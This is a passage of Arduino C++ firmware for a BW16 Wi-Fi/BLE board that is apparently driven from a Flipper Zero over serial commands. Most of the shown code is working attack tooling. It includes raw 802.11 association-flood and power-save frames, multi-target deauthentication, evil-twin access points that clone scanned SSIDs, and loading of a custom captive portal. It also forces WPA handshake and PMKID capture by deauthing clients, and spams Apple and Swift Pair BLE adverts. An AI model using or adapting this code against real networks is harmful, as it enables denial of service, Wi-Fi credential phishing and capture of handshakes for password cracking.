  f[n++] = 0x11; f[n++] = 0x04;             // capability: ESS | Privacy
  f[n++] = 0x0A; f[n++] = 0x00;             // listen interval
  int sl = ssid ? (int)strlen(ssid) : 0;
  if(sl > 32) sl = 32;
  f[n++] = 0x00; f[n++] = (uint8_t)sl;      // SSID element
  memcpy(f + n, ssid, sl); n += sl;
  f[n++] = 0x01; f[n++] = 0x08;             // supported rates
  { const uint8_t r[8] = {0x82,0x84,0x8B,0x96,0x0C,0x12,0x18,0x24}; memcpy(f + n, r, 8); n += 8; }
  f[n++] = 0x32; f[n++] = 0x04;             // extended supported rates
  { const uint8_t r[4] = {0x30,0x48,0x60,0x6C}; memcpy(f + n, r, 4); n += 4; }
  { const uint8_t rsn[22] = {0x30,0x14,0x01,0x00,0x00,0x0F,0xAC,0x04,0x01,0x00,0x00,0x0F,0xAC,0x04,0x01,0x00,0x00,0x0F,0xAC,0x02,0x00,0x00};
    memcpy(f + n, rsn, 22); n += 22; }
  wifi_tx_raw_frame(f, n);
}

// Null data frame with the power-management bit set: "I am going to sleep". An AP keeps the
// table entry of a dozing client instead of reaping it, so the flood's entries survive longer.
static void flood_tx_sleep(const uint8_t* bssid, const uint8_t* sta) {
  uint8_t f[24];
  memset(f, 0, sizeof(f));
  f[0] = 0x48; f[1] = 0x10;                 // frame control: null data, PM bit set
  memcpy(f + 4, bssid, 6);
  memcpy(f + 10, sta, 6);
  memcpy(f + 16, bssid, 6);
  wifi_tx_raw_frame(f, 24);
}

// The target's SSID from the last SCAN - many APs reject an association with an empty/wrong SSID.
static String flood_ssid_for(const uint8_t* bssid) {
  for(unsigned j = 0; j < scan_results.size(); j++)
    if(!memcmp(scan_results[j].bssid, bssid, 6)) return scan_results[j].ssid;
  return String("");
}

// --- A: HELLO/IDENT handshake + capability advertisement ----------------------
// Mirrors 5Ghost's HELLO -> IDENT so a host can version-check and gate features.
// caps letters (5Ghost-compatible): D=deauth S=stascan E=evil/AP B=beacon H=handshake.
// Ours on top: L=ble I=iBeacon C=BLE adv K=KARMA R=responder T=btm F=auth/assoc flood
// A=sae commit flood.
// We advertise "DSEBH" (no BLE -> no L/I/C/K).
#define DELFY_FW_VERSION "1.0.0"
#define DELFY_FW_CAPS "DSEBHLICKRTFA"

// --- C: P3 multi-target deauth list (DEAUTHADD / DEAUTHRUN) -------------------
#define DAUTH_MAX 8
typedef struct {
  uint8_t bssid[6];
  uint8_t client[6];
  uint8_t ch;
  bool have_client;
} dauth_t;
static dauth_t dauth_list[DAUTH_MAX];
static volatile uint8_t dauth_n = 0;
static volatile bool dauth_run = false;
static uint8_t dauth_idx = 0;

static void hex_to_mac(const String& h, uint8_t* out) {
  for (int i = 0; i < 6; i++)
    out[i] = (uint8_t)strtoul(h.substring(i * 2, i * 2 + 2).c_str(), NULL, 16);
}

static void dauth_add(const uint8_t* bssid, const uint8_t* client, bool have_client, uint8_t ch) {
  if (dauth_n >= DAUTH_MAX) return;
  dauth_t* t = &dauth_list[dauth_n];
  memcpy(t->bssid, bssid, 6);
  if (have_client && client) memcpy(t->client, client, 6);
  else memset(t->client, 0xFF, 6);
  t->have_client = have_client;
  t->ch = ch;
  dauth_n++;
}

// Async grab state (HSGRAB/PKGRAB). A blocking deauth burst stalls the WiFi task on
// this driver, so the deauth is driven from the main loop (same cadence as DEAUTHRUN,
// which is proven), then the state flips to promisc capture.
#define HSG_IDLE     0
#define HSG_DISCOVER 1
#define HSG_DEAUTH   2
#define HSG_CAPTURE  3
static volatile int hsg_phase = HSG_IDLE;
static volatile uint32_t hsg_t = 0;
static volatile uint32_t hsg_disc_ms = 5000;
static volatile uint32_t hsg_deauth_ms = 4000;
static volatile uint32_t hsg_cap_ms = 15000;
static volatile bool hsg_pmkid = false;
static uint8_t hsg_bssid[6];
static volatile int hsg_ch = 6;
// B: async passive CAPTURE (armed by CAPTURE, finished by loop() or CAPSTOP).
static volatile bool cap_active = false;
static volatile uint32_t cap_deadline = 0;
static volatile int cap_ch = 6;

// --- P8: BLE scan (AmebaBLE library) ---
#define BLE_MAX 16
static char ble_addr[BLE_MAX][20];
static char ble_name[BLE_MAX][24];
static char ble_tag[BLE_MAX][12];
static char ble_raw[BLE_MAX][64];   // raw advertising data as hex
static int8_t ble_rssi[BLE_MAX];
static volatile uint8_t ble_n = 0;
static BLEAdvertData ble_adv;
static BLEHIDKeyboard ble_kbd;
static BLEAdvertData ble_hidadv;

static void ble_classify(BLEAdvertData& a, char* tag, size_t cap) {
  tag[0] = '\0';
  String nm = a.getName();
  if(nm.indexOf("Flipper") >= 0) { snprintf(tag, cap, "Flipper"); return; }
  if(a.hasManufacturer()) {
    uint16_t mf = a.getManufacturer();
    if(mf == 0x004C || mf == 0x4C00) {          // Apple (FindMy trackers use type 0x12)
      uint8_t* md = a.getManufacturerData();
      uint8_t ml = a.getManufacturerDataLength();
      if(ml >= 1 && md[0] == 0x12) snprintf(tag, cap, "FindMy");
      else snprintf(tag, cap, "Apple");
    } else if(mf == 0x0006 || mf == 0x0600) {
      snprintf(tag, cap, "MS");
    } else {
      snprintf(tag, cap, "mf%04X", mf);
    }
    return;
  }
  if(nm.length() == 0) snprintf(tag, cap, "--");
}

static void ble_scan_cb(T_LE_CB_DATA* p_data) {
  ble_adv.parseScanInfo(p_data);
  BLEAddr a = ble_adv.getAddr();
  const char* as = a.str();
  char tag[12];
  ble_classify(ble_adv, tag, sizeof(tag));
  // Raw advertising data (hex) straight from the stack.
  T_LE_SCAN_INFO* si = p_data->p_le_scan_info;
  uint8_t dl = si->data_len; if(dl > 31) dl = 31;
  char raw[64]; int rp = 0;
  for(uint8_t k = 0; k < dl && rp < 60; k++) rp += snprintf(raw + rp, 3, "%02x", si->data[k]);
  raw[rp] = '\0';
  for (uint8_t i = 0; i < ble_n; i++) {
    if (strcmp(ble_addr[i], as) == 0) {          // already seen -> refresh name/tag/rssi/raw
      ble_rssi[i] = ble_adv.getRSSI();
      strncpy(ble_raw[i], raw, sizeof(ble_raw[0]) - 1);
      ble_raw[i][sizeof(ble_raw[0]) - 1] = '\0';
      if(ble_tag[i][0] == '\0' && tag[0]) { strncpy(ble_tag[i], tag, sizeof(ble_tag[0]) - 1); }
      if (ble_name[i][0] == '\0' && ble_adv.hasName()) {
        strncpy(ble_name[i], ble_adv.getName().c_str(), sizeof(ble_name[0]) - 1);
        ble_name[i][sizeof(ble_name[0]) - 1] = '\0';
      }
      return;
    }
  }
  if (ble_n >= BLE_MAX) return;
  snprintf(ble_addr[ble_n], sizeof(ble_addr[0]), "%s", as);
  ble_name[ble_n][0] = '\0';
  if (ble_adv.hasName()) {
    strncpy(ble_name[ble_n], ble_adv.getName().c_str(), sizeof(ble_name[0]) - 1);
    ble_name[ble_n][sizeof(ble_name[0]) - 1] = '\0';
  }
  strncpy(ble_tag[ble_n], tag, sizeof(ble_tag[0]) - 1);
  ble_tag[ble_n][sizeof(ble_tag[0]) - 1] = '\0';
  strncpy(ble_raw[ble_n], raw, sizeof(ble_raw[0]) - 1);
  ble_raw[ble_n][sizeof(ble_raw[0]) - 1] = '\0';
  ble_rssi[ble_n] = ble_adv.getRSSI();
  ble_n++;
}

static void ble_stream() {
  for (uint8_t i = 0; i < ble_n; i++) {
    char line[160];
    snprintf(line, sizeof(line), "BLE:%s|%d|%s|%s|%s", ble_addr[i], ble_rssi[i], ble_name[i], ble_tag[i], ble_raw[i]);
    Serial.println(line); Serial1.println(line);
  }
  String fin = "BLEDONE: n=" + String((unsigned)ble_n);
  Serial.println(fin); Serial1.println(fin);
}

void loop() {
  // Drain both UARTs fast (no per-char delay) so long chunked lines aren't dropped; we
  // only process once a full '\n'-terminated command is in.
  while (Serial1.available()) { readString += (char)Serial1.read(); }
  while (Serial.available())   { readString += (char)Serial.read(); }
  if(readString.length() > 0 && readString.charAt(readString.length() - 1) == '\n'){
    rec_note(readString);   // F5: capture actions for macro recording (filtered inside)
    if(readString.substring(0,4)=="SCAN"){
      if(apActive)
        destroyAP();
      deauth_wifis.clear();
      DEBUG_SER_PRINT("Stop randomSSID\n");
      randomSSID = false;
      rickroll=false;
      ssid="";

      while (scanNetworks(5000)){
        delay(1000);
      }
      Serial1.print("SCAN:OK\n");
      Serial.print("SCAN:OK\n");
      
    }else if(readString.substring(0,4)=="STOP"){
      DEBUG_SER_PRINT("Stop deauthing\n");
      dauth_run = false;   // C: also disarm the multi-target deauth list
      dauth_n = 0;
      if(cap_active){ wifi_set_promisc(0, NULL, 0); hs_cap = false; cap_active = false; }
      hsg_phase = HSG_IDLE;  // abort any in-flight HSGRAB/PKGRAB
      ghostSpam = false;
      secured = false;
      strcpy(wpa_pass,"");
      if(readString.length()>5 && !apActive){
        unsigned int numStation = readString.substring(5,readString.length()-1).toInt();
        if(numStation < scan_results.size()){
          wifis_temp.clear();
          unsigned int num_st_tmp;
          
          for(unsigned int i=0; i<deauth_wifis.size(); i++){
            num_st_tmp=deauth_wifis[i];
            if(num_st_tmp != numStation){
              wifis_temp.push_back(num_st_tmp);
            }
          }
          deauth_wifis.clear();
          for(unsigned int i=0; i<wifis_temp.size(); i++){
            num_st_tmp=wifis_temp[i];
            deauth_wifis.push_back(num_st_tmp);
          }
        }
      }else{
        destroyAP();
        deauth_wifis.clear();
        DEBUG_SER_PRINT("Stop randomSSID\n");
        randomSSID = false;
        rickroll=false;
        ssid="";
      }
      digitalWrite(LED_G, 0);
       
    }else if(readString.substring(0,6)=="RANDOM"){
      DEBUG_SER_PRINT("Start randomSSID\n");
      randomSSID = true;
        
    }else if(readString.substring(0,5)=="BSSID"){
      
      ssid = readString.substring(6,readString.length()-1);
      DEBUG_SER_PRINT("Starting BSSID "+ssid+"\n");
       
    }else if(readString.substring(0,7)=="APSTART"){
      char ssid[33];  // o el tamaño que necesites
      
      String ap_ssid = readString.substring(8,readString.length()-1);
      ap_ssid.toCharArray(ssid, 33);
      build_portal_urls(ssid);   // portal host derives from the AP name (before createAP)
      if(secured){
        createAP(ssid, ap_channel,wpa_pass);
      }else{
        createAP(ssid,ap_channel);
      }
      DEBUG_SER_PRINT("Starting BSSID "+ap_ssid+"\n");
        if(!serveBegined){
          server.begin();
          serveBegined=true;
        }
        // apActive is set by createAP() itself (and only when the AP actually came up), so a
        // failed start no longer leaves the app thinking an AP is running.

    }else if(readString.substring(0,8)=="RICKROLL"){
      
      rickroll =true;
      DEBUG_SER_PRINT("Starting BSSID "+ssid+"\n");
       
    }else if(readString.substring(0,9)=="GHOSTSPAM"){
      ghostSpam = true;
      DEBUG_SER_PRINT("Start GHOSTSPAM\n");
    }else if(readString.substring(0,10)=="PORTALHTML"){
      // Custom portal: append hex-encoded HTML (chunked from the Flipper SD file).
      // Parse hex char-by-char (no String temporaries -> no heap churn over many chunks).
      int s1 = readString.indexOf(' ');
      String hex = (s1 > 0) ? readString.substring(s1+1, readString.length()-1) : String("");
      const char* h = hex.c_str();
      uint16_t added = 0;
      for(int i = 0; h[i] && h[i+1] && customPortalLen < sizeof(customPortal) - 1; i += 2){
        int hi = hexnib(h[i]);
        int lo = hexnib(h[i+1]);
        if(hi < 0 || lo < 0) break;
        customPortal[customPortalLen++] = (char)((hi << 4) | lo);
        added++;
      }
      customPortal[customPortalLen] = 0;
      String r = "PORTALHTML:+" + String((unsigned)added) + " total=" + String((unsigned)customPortalLen);
      Serial.println(r); Serial1.println(r);
    }else if(readString.substring(0,9)=="PORTALROT"){
      // C2: enable/disable portal rotation. Args: PORTALROT <0|1>
      int s1 = readString.indexOf(' ');
      int v = (s1 > 0) ? readString.substring(s1+1, readString.length()-1).toInt() : 0;
      portal_rot = (v != 0);
      String r = String("PORTALROT:") + (portal_rot ? "on" : "off");
      Serial.println(r); Serial1.println(r);
    }else if(readString.substring(0,11)=="PORTALCLEAR"){
      customPortalLen = 0;
      customPortal[0] = 0;
      Serial.println("PORTALCLEAR:ok"); Serial1.println("PORTALCLEAR:ok");
    }else if(readString.substring(0,10)=="PORTALHASH"){
      // Diagnostic: length + FNV-1a hash of the loaded custom portal, so we can prove the
      // bytes the board serves are identical to the SD file (catches upload corruption).
      unsigned long h = 2166136261UL;
      for(unsigned int i=0; i<customPortalLen; i++){ h ^= (uint8_t)customPortal[i]; h *= 16777619UL; }
      char b[80];
      snprintf(b, sizeof(b), "PORTALHASH:%u:%08lx", (unsigned)customPortalLen, h);
      Serial.println(b); Serial1.println(b);
    }else if(readString.substring(0,6)=="PORTAL"){
      portal = readString.substring(7,readString.length()-1).toInt();
       
    }else if(readString.substring(0,6)=="REASON"){
      deauth_reason = readString.substring(7,readString.length()-1).toInt();
       
    }else if(readString.substring(0,8)=="PASSWORD"){
      String password;
      password = readString.substring(9,readString.length()-1).c_str();
      password.toCharArray(wpa_pass, 64);
      Serial.println(password);
      Serial.println(wpa_pass);
      secured=true;

      
    
    }else if(readString.substring(0,7)=="CHANNEL"){
    readString.substring(8,readString.length()-1).toCharArray(ap_channel,4);


    }else if(readString.substring(0,5)=="APMAC"){
      String mac;
      mac = readString.substring(6,readString.length()-1);
      //wifi_disconnect();
      DEBUG_SER_PRINT("APMAC "+mac+"\n");
      if(mac.length()==17){
        useCustomMac=true;
        
        char macStr[18]; 
        mac.toCharArray(macStr, sizeof(macStr)); 

        char *token = strtok(macStr, ":");
        int i = 0;

        while (token != NULL && i < 6) {
            customMac[i] = strtoul(token, NULL, 16);
            token = strtok(NULL, ":");
            i++;
        }
        


        Serial.print("MAC en bytes: ");
        for (int i = 0; i < 6; i++) {
            if (customMac[i] < 0x10) Serial.print("0"); 
            Serial.print(customMac[i], HEX);
            if (i < 7) Serial.print(":");
        }
        Serial.println();
        mac.replace(":","");
        int ret = wifi_change_mac_address_from_ram(1,customMac);
        if(ret==RTW_ERROR){
          Serial1.println("ERROR:Bad Mac");
          Serial.println("ERROR:Bad Mac");
        }
      }else{
        useCustomMac=false;
      }
       
    }else if(readString.substring(0,5)=="HELLO"){
      // A: capability/handshake advertisement (5Ghost-compatible shape).
      String id = String("IDENT:brand=DELFY;fw=") + DELFY_FW_VERSION +
                  ";proto=1;caps=" + DELFY_FW_CAPS + ";board=BW16";
      Serial.println(id); Serial1.println(id);
    }else if(readString.substring(0,9)=="DEAUTHADD"){
      // C: add a target to the multi-target deauth list.
      // Args: DEAUTHADD <bssid-12hex> [client-12hex] [ch]
      int s1 = readString.indexOf(' ');
      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
      int s3 = (s2 > 0) ? readString.indexOf(' ', s2+1) : -1;
      String b = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1) : String("");
      String c = (s2 > 0) ? readString.substring(s2+1, s3>0?s3:readString.length()-1) : String("");
      int ch = (s3 > 0) ? readString.substring(s3+1, readString.length()-1).toInt() : 6;
      if(b.length() != 12 || ch < 1 || ch > 165){
        Serial.println("ERR:DEAUTHADD:badargs"); Serial1.println("ERR:DEAUTHADD:badargs");
      }else if(dauth_n >= DAUTH_MAX){
        Serial.println("ERR:DEAUTHADD:full"); Serial1.println("ERR:DEAUTHADD:full");
      }else{
        uint8_t bssid[6]; hex_to_mac(b, bssid);
        uint8_t client[6]; bool have = false;
        if(c.length() == 12){ hex_to_mac(c, client); have = true; }
        dauth_add(bssid, have ? client : NULL, have, (uint8_t)ch);
        String r = "DEAUTHADD:OK n=" + String((unsigned)dauth_n);
        Serial.println(r); Serial1.println(r);
      }
    }else if(readString.substring(0,9)=="DEAUTHRUN"){
      // C: arm the accumulated list (round-robin in loop()).
      dauth_run = (dauth_n > 0);
      dauth_idx = 0;
      String r = "DEAUTHRUN:" + String(dauth_run ? "on n=" : "no-targets n=") + String((unsigned)dauth_n);
      Serial.println(r); Serial1.println(r);
    }else if(readString.substring(0,11)=="DEAUTHCLEAR"){
      // C: clear the list WITHOUT the WiFi teardown that STOP does.
      dauth_run = false;
      dauth_n = 0;
      Serial.println("DEAUTHCLEAR:ok"); Serial1.println("DEAUTHCLEAR:ok");
    }else if(readString.substring(0,6)=="DEAUTH" || readString.substring(0,4)=="EVIL"){
      int numStation;
      if(readString.substring(0,4)=="EVIL"){
        numStation = readString.substring(5,readString.length()-1).toInt();
      }else{
        numStation = readString.substring(7,readString.length()-1).toInt();
      }
      if(numStation < (int)scan_results.size()&&numStation >=0){
        DEBUG_SER_PRINT("Deauthing "+(String)numStation+"\n");
        deauth_wifis.push_back(numStation);
        DEBUG_SER_PRINT("Deauthing "+scan_results[numStation].ssid+"\n");
        if(readString.substring(0,4)=="EVIL"){
          int str_len = scan_results[numStation].ssid.length() + 1; 

          // Prepare the character array (the buffer) 
          char char_array[str_len];

          // Copy it over 
          scan_results[numStation].ssid.toCharArray(char_array, str_len);
          char buffer[4];  // Suficiente para "123\0"
          itoa(scan_results[numStation].channel, buffer, 10);
          if(str_len>1)
            createAP(char_array, buffer);
          else
            Serial1.print("ERROR: BAD SSID, please try to rescan again");
        }
      

      }else{
        DEBUG_SER_PRINT("Wrong AP");
      }
      

    }else if(readString.substring(0,4)=="PING"){
      
      Serial.print("PONG\n");
      Serial1.print("PONG\n");
      
    }else if(readString.substring(0,4)=="LIST"){
      
      for (uint i = 0; i < scan_results.size(); i++) {
        Serial.print("AP:"+String(i)+"|");
        Serial.print(scan_results[i].ssid + "|");
        Serial1.print("AP:"+String(i)+"|");
        Serial1.print(scan_results[i].ssid + "|");
        {
          // %02X: bytes <0x10 must keep their leading zero, else the host's colon-stripped
          // 12-hex BSSID (used by HSGRAB/PKGRAB/DEAUTHADD) comes up short and is rejected,
          // and the info screen's MAC is wrong. (Arduino's print(x, HEX) does NOT pad.)
          char mac[18];
          snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
                   scan_results[i].bssid[0], scan_results[i].bssid[1],
                   scan_results[i].bssid[2], scan_results[i].bssid[3],
                   scan_results[i].bssid[4], scan_results[i].bssid[5]);
          Serial.print(mac);
          Serial1.print(mac);
        }
        Serial.print("|" + String(scan_results[i].channel) + "|");
        Serial.print(String(scan_results[i].security) + "|");
        Serial.print(String(scan_results[i].rssi) + "\n");
        Serial1.print("|" + String(scan_results[i].channel) + "|");
        Serial1.print(String(scan_results[i].security) + "|");
        Serial1.print(String(scan_results[i].rssi) + "\n");
      }

    }else if(readString.substring(0,11)=="PROMISCTEST"){
      // GATE experiment: set channel, passively capture 802.11 frames, report counts.
      // Args: PROMISCTEST <chan> [seconds]  (default 10s, max 60s).
      int s1 = readString.indexOf(' ');
      int s2 = readString.indexOf(' ', s1+1);
      int ch = readString.substring(s1+1, s2>0?s2:readString.length()-1).toInt();
      int secs = (s2>0) ? readString.substring(s2+1, readString.length()-1).toInt() : 10;
      if(ch < 1 || ch > 165) ch = 6;
      if(secs < 1 || secs > 60) secs = 10;
      pm_total=0; pm_mgmt=0; pm_ctrl=0; pm_data=0; pm_eapol=0;
      wext_set_channel(WLAN0_NAME, ch);
      wifi_set_promisc(3 /*RTW_PROMISC_ENABLE_2: all 802.11 frames*/, promisc_spike_cb, 0);
      for(int i=0;i<secs;i++) delay(1000);
      wifi_set_promisc(0 /*RTW_PROMISC_DISABLE*/, NULL, 0);
      String r = "PROMISC: ch="+String(ch)+" total="+String((unsigned)pm_total)+
                 " mgmt="+String((unsigned)pm_mgmt)+" ctrl="+String((unsigned)pm_ctrl)+
                 " data="+String((unsigned)pm_data)+" eapol="+String((unsigned)pm_eapol);
      Serial.println(r); Serial1.println(r);
    }else if(readString.substring(0,7)=="CAPTURE"){
      // P5: monitor <chan> for [secs] and stream any EAPOL (4-way) frames as HSFRAME:<hex>.
      // Passive — no injection. Args: CAPTURE <chan> [seconds]  (default 10s, max 60s).
      int s1 = readString.indexOf(' ');
      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
      int ch = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1).toInt() : 6;
      int secs = (s2 > 0) ? readString.substring(s2+1, readString.length()-1).toInt() : 10;
      if(ch < 1 || ch > 165) ch = 6;
      if(secs < 1 || secs > 60) secs = 10;
      if(apActive) destroyAP();   // tear the softAP down first: its HTTP accept loop starves
                                  // the monitor capture (CAPTURE/HSGRAB otherwise never finish)
      hs_count = 0;
      cap_ch = ch;
      hs_cap = true;
      wext_set_channel(WLAN0_NAME, ch);
      wifi_set_promisc(3 /*RTW_PROMISC_ENABLE_2: all 802.11 frames*/, promisc_spike_cb, 0);
      cap_deadline = millis() + (uint32_t)secs * 1000u;
      cap_active = true;   // loop() finishes it after `secs`; CAPSTOP aborts early
      Serial.println("CAPTURE: armed"); Serial1.println("CAPTURE: armed");
    }else if(readString.substring(0,7)=="CAPSTOP"){
      // B: abort an in-flight capture and stream what we have.
      if(cap_active){
        wifi_set_promisc(0 /*RTW_PROMISC_DISABLE*/, NULL, 0);
        hs_cap = false;
        cap_active = false;
        hs_stream(cap_ch);
      }else{
        Serial.println("CAPSTOP: idle"); Serial1.println("CAPSTOP: idle");
      }
    }else if(readString.substring(0,6)=="HSGRAB"){
      // P5 active: capture on <chan> while deauthing <bssid> to force a fresh 4-way.
      // Args: HSGRAB <chan> <bssid-12hex> [seconds]  (default 10s, max 60s).
      // CAVEAT: injection during promisc is unverified on this driver — if no EAPOL lands,
      // stop, deauth in STA mode for ~2s, then run CAPTURE (clients re-assoc in 1-3s).
      int s1 = readString.indexOf(' ');
      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
      int s3 = (s2 > 0) ? readString.indexOf(' ', s2+1) : -1;
      int ch = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1).toInt() : 6;
      String bssid_hex = (s2 > 0) ? readString.substring(s2+1, s3>0?s3:readString.length()-1) : String("");
      int secs = (s3 > 0) ? readString.substring(s3+1, readString.length()-1).toInt() : 10;
      if(ch < 1 || ch > 165) ch = 6;
      if(secs < 1 || secs > 60) secs = 10;
      uint8_t bssid[6]; bool ok_bssid = (bssid_hex.length() == 12);
      for(int i=0; ok_bssid && i < 6; i++)
        bssid[i] = (uint8_t)strtoul(bssid_hex.substring(i*2, i*2+2).c_str(), NULL, 16);
      if(!ok_bssid){
        Serial.println("ERROR: HSGRAB needs <chan> <bssid-12hex> [secs]");
        Serial1.println("ERROR: HSGRAB needs <chan> <bssid-12hex> [secs]");
      }else{
        if(apActive) destroyAP();   // as above: no monitor capture while the softAP runs
        hs_count = 0;
        memcpy(hsg_bssid, bssid, 6);
        hsg_ch = ch;
        hsg_cap_ms = (uint32_t)secs * 1000u;
        hsg_pmkid = false;
        sta_n = 0;
        wext_set_channel(WLAN0_NAME, ch);
        wifi_set_promisc(3 /*RTW_PROMISC_ENABLE_2*/, promisc_sta_cb, 0);
        hsg_t = millis();
        hsg_phase = HSG_DISCOVER;  // discover STAs -> unicast deauth -> capture
        Serial.println("HSGRAB: armed"); Serial1.println("HSGRAB: armed");
      }
    }else if(readString.substring(0,7)=="BLESCAN"){
      // P8: BLE scan. Args: BLESCAN [secs]  (default 5s, max 30s).
      int secs = readString.substring(8, readString.length()-1).toInt();
      if(secs < 1 || secs > 30) secs = 5;
      ble_n = 0;
      BLE.init();
      BLE.configScan()->setScanMode(GAP_SCAN_MODE_ACTIVE);
      BLE.configScan()->setScanInterval(500);
      BLE.configScan()->setScanWindow(250);
      BLE.configScan()->updateScanParams();
      BLE.setScanCallback(ble_scan_cb);
      BLE.beginCentral(0);
      BLE.configScan()->startScan((uint32_t)secs * 1000u);
      ble_stream();
      BLE.end();
    }else if(readString.substring(0,10)=="BLEIBEACON"){
      // P9: advertise an iBeacon. Args: BLEIBEACON <uuid-32hex> <major> <minor> [secs]
      int s1 = readString.indexOf(' ');
      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
      int s3 = (s2 > 0) ? readString.indexOf(' ', s2+1) : -1;
      int s4 = (s3 > 0) ? readString.indexOf(' ', s3+1) : -1;
      String uuid = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1) : String("");
      int major = (s2 > 0) ? readString.substring(s2+1, s3>0?s3:readString.length()-1).toInt() : 0;
      int minor = (s3 > 0) ? readString.substring(s3+1, s4>0?s4:readString.length()-1).toInt() : 0;
      int secs = (s4 > 0) ? readString.substring(s4+1, readString.length()-1).toInt() : 10;
      if(secs < 1 || secs > 120) secs = 10;
      if(uuid.length() != 32){
        Serial.println("ERR:BLEIBEACON:uuid"); Serial1.println("ERR:BLEIBEACON:uuid");
      }else{
        uint8_t b[31]; uint8_t n = 0;
        b[n++]=0x02; b[n++]=0x01; b[n++]=0x06;                          // flags
        b[n++]=0x1A; b[n++]=0xFF; b[n++]=0x4C; b[n++]=0x00; b[n++]=0x02; b[n++]=0x15; // Apple iBeacon
        for(int i = 0; i < 16; i++) b[n++] = (uint8_t)strtoul(uuid.substring(i*2, i*2+2).c_str(), NULL, 16);
        b[n++]=(uint8_t)((major >> 8) & 0xFF); b[n++]=(uint8_t)(major & 0xFF);
        b[n++]=(uint8_t)((minor >> 8) & 0xFF); b[n++]=(uint8_t)(minor & 0xFF);
        b[n++]=0xC5; // tx power -59 dBm
        BLE.init();
        BLE.beginPeripheral();
        BLEAdvert* ad = BLE.configAdvert();
        ad->setAdvData(b, n);
        ad->startAdv();
        Serial.println("BLEIBEACON:on"); Serial1.println("BLEIBEACON:on");
        for(int i=0;i<secs;i++) delay(1000);
        ad->stopAdv();
        BLE.end();
        Serial.println("BLEIBEACON:off"); Serial1.println("BLEIBEACON:off");
      }
    }else if(readString.substring(0,6)=="BLEADV"){
      // P9: advertise raw adv-data bytes. Args: BLEADV <hex> [secs]
      int s1 = readString.indexOf(' ');
      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
      String hex = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1) : String("");
      int secs = (s2 > 0) ? readString.substring(s2+1, readString.length()-1).toInt() : 10;
      if(secs < 1 || secs > 120) secs = 10;
      uint8_t buf[31]; uint8_t n = 0;
      for(int i = 0; i + 1 < (int)hex.length() && n < 31; i += 2)
        buf[n++] = (uint8_t)strtoul(hex.substring(i, i+2).c_str(), NULL, 16);
      if(n == 0){
        Serial.println("ERR:BLEADV:badhex"); Serial1.println("ERR:BLEADV:badhex");
      }else{
        BLE.init();
        BLE.beginPeripheral();
        BLEAdvert* ad = BLE.configAdvert();
        ad->setAdvData(buf, n);
        ad->startAdv();
        Serial.println("BLEADV:on"); Serial1.println("BLEADV:on");
        for(int i=0;i<secs;i++) delay(1000);
        ad->stopAdv();
        BLE.end();
        Serial.println("BLEADV:off"); Serial1.println("BLEADV:off");
      }
    }else if(readString.substring(0,7)=="BLESPAM"){
      // D2: rotate BLE advert payloads (Apple continuity / Swift Pair).
      // Args: BLESPAM <type 0=pp 1=action 2=airdrop 3=swift 4=all> [secs]
      int s1 = readString.indexOf(' ');
      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
      int type = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1).toInt() : 4;
      int secs = (s2 > 0) ? readString.substring(s2+1, readString.length()-1).toInt() : 30;
      if(type < 0 || type > 4) type = 4;
      if(secs < 1 || secs > 120) secs = 30;
      if(apActive) destroyAP();
      BLE.init();
      BLE.beginPeripheral();
      BLEAdvert* ad = BLE.configAdvert();
      uint8_t pkt[31];
      unsigned long end = millis() + (unsigned long)secs * 1000UL;
      uint8_t t = 0;
      while((long)(millis() - end) < 0) {
        uint8_t use = (type == 4) ? (uint8_t)(t % 4) : (uint8_t)type;
        uint8_t n = blespam_pkt(pkt, use);
        ad->setAdvData(pkt, n);
        ad->startAdv();
        delay(120);
        ad->stopAdv();
        t++;
      }
      BLE.end();
      String r = "BLESPAM:off " + String((unsigned)t);
      Serial.println(r); Serial1.println(r);
    }else if(readString.substring(0,12)=="BLEGATTPROBE"){
      // P10: connect + enumerate GATT. Args: BLEGATTPROBE <aa:bb:..> [type 0=pub 1=rand]
      // Services/characteristics print to USB serial (SDK only exposes printServices()).
      int s1 = readString.indexOf(' ');
      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
      String addr = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1) : String("");
      int at = (s2 > 0) ? readString.substring(s2+1, readString.length()-1).toInt() : 1;
      if(addr.length() != 17){
        Serial.println("ERR:BLEGATTPROBE:addr"); Serial1.println("ERR:BLEGATTPROBE:addr");
      }else{
        BLE.init();
        BLE.beginCentral(0);
        char ab[18]; addr.toCharArray(ab, sizeof(ab));
        BLEConnect* conn = BLE.configConnection();
        Serial.println("GATT: connecting..."); Serial1.println("GATT: connecting...");
        T_GAP_REMOTE_ADDR_TYPE ta =
          (T_GAP_REMOTE_ADDR_TYPE)(at ? GAP_REMOTE_ADDR_LE_RANDOM : GAP_REMOTE_ADDR_LE_PUBLIC);
        T_GAP_REMOTE_ADDR_TYPE tb =
          (T_GAP_REMOTE_ADDR_TYPE)(at ? GAP_REMOTE_ADDR_LE_PUBLIC : GAP_REMOTE_ADDR_LE_RANDOM);
        bool cok = conn->connect(ab, ta, 6000);
        if(!cok) cok = conn->connect(ab, tb, 6000);  // retry with the other addr type
        if(cok){
          BLEClient* cl = BLE.addClient(0);
          for(int i = 0; i < 30 && !cl->connected(); i++) delay(100);
          cl->discoverServices();
          for(int i = 0; i < 50 && !cl->discoveryDone(); i++) delay(100);
          cl->printServices();  // service + characteristic UUIDs -> USB serial
          // Also stream the discovered tree to the Flipper so the host can show it
          // (printServices only writes to the SDK/USB log).
          for(uint8_t si = 0; si < cl->getServiceCount(); si++) {
            char line[96];
            snprintf(line, sizeof(line), "GATT:S|%s", cl->getServiceUuid(si));
            Serial.println(line); Serial1.println(line);
            for(uint8_t ci = 0; ci < cl->getCharacteristicCount(si); ci++) {
              char l2[96];
